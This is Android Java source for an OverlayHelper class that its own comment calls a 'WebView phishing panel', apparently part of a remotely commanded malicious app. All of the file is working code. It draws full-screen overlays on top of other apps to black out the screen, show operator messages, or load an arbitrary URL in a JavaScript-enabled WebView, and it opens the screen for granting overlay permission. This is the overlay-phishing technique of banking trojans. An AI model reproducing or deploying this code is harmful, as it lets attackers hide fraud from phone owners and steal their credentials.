package com.java.panel;

import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import android.widget.FrameLayout;
import android.widget.TextView;

/**
 * SYSTEM_ALERT_WINDOW overlays + simple WebView phishing panel.
 * Requires overlay permission granted by user (or Accessibility guided grant).
 */
public class OverlayHelper {

    private static View currentOverlay = null;
    private static WindowManager windowManager = null;

    public static String showBlackout(Context ctx, int seconds) {
        return showColorOverlay(ctx, Color.BLACK, " ", seconds);
    }

    public static String showMessage(Context ctx, String message, int seconds) {
        return showColorOverlay(ctx, Color.parseColor("#1a1a1a"), message, seconds);
    }

    private static String showColorOverlay(Context ctx, int color, String message, int seconds) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(ctx)) {
                return "❌ Overlay permission missing. Open settings: /overlay request";
            }
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    dismissInternal(ctx);
                    windowManager = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                    TextView tv = new TextView(ctx);
                    tv.setBackgroundColor(color);
                    tv.setTextColor(Color.WHITE);
                    tv.setText(message != null ? message : "");
                    tv.setGravity(Gravity.CENTER);
                    tv.setTextSize(18f);
                    tv.setPadding(40, 40, 40, 40);

                    WindowManager.LayoutParams params = buildParams();
                    windowManager.addView(tv, params);
                    currentOverlay = tv;

                    if (seconds > 0) {
                        new Handler(Looper.getMainLooper()).postDelayed(() -> dismissInternal(ctx), seconds * 1000L);
                    }
                } catch (Exception ignored) {}
            });
            return "✅ Overlay shown" + (seconds > 0 ? " for " + seconds + "s" : "");
        } catch (Exception e) {
            return "❌ Overlay error: " + e.getMessage();
        }
    }

    public static String showWebView(Context ctx, String url, int seconds) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(ctx)) {
                return "❌ Overlay permission missing. Use /overlay request";
            }
            if (url == null || url.isEmpty()) return "❌ Usage: /webview <url> [seconds]";
            if (!url.startsWith("http")) url = "https://" + url;
            final String finalUrl = url;

            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    dismissInternal(ctx);
                    windowManager = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                    FrameLayout container = new FrameLayout(ctx);
                    WebView wv = new WebView(ctx);
                    WebSettings ws = wv.getSettings();
                    ws.setJavaScriptEnabled(true);
                    ws.setDomStorageEnabled(true);
                    wv.setWebViewClient(new WebViewClient());
                    wv.loadUrl(finalUrl);
                    container.addView(wv, new FrameLayout.LayoutParams(
                            FrameLayout.LayoutParams.MATCH_PARENT,
                            FrameLayout.LayoutParams.MATCH_PARENT));

                    WindowManager.LayoutParams params = buildParams();
                    windowManager.addView(container, params);
                    currentOverlay = container;

                    if (seconds > 0) {
                        new Handler(Looper.getMainLooper()).postDelayed(() -> dismissInternal(ctx), seconds * 1000L);
                    }
                } catch (Exception ignored) {}
            });
            return "✅ WebView overlay loaded: " + finalUrl;
        } catch (Exception e) {
            return "❌ WebView error: " + e.getMessage();
        }
    }

    public static String dismiss(Context ctx) {
        new Handler(Looper.getMainLooper()).post(() -> dismissInternal(ctx));
        return "✅ Overlay dismissed";
    }

    private static void dismissInternal(Context ctx) {
        try {
            if (currentOverlay != null && windowManager != null) {
                windowManager.removeViewImmediate(currentOverlay);
            }
        } catch (Exception ignored) {}
        currentOverlay = null;
    }

    private static WindowManager.LayoutParams buildParams() {
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        return params;
    }

    public static String requestPermission(Context ctx) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + ctx.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                return "📱 Overlay permission screen opened. Grant 'Display over other apps'.";
            }
            return "✅ Overlay permission not required on this Android version.";
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    public static String status(Context ctx) {
        boolean can = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            can = Settings.canDrawOverlays(ctx);
        }
        return "🪟 Overlay permission: " + (can ? "GRANTED" : "DENIED")
                + "\nActive overlay: " + (currentOverlay != null ? "YES" : "NO");
    }
}
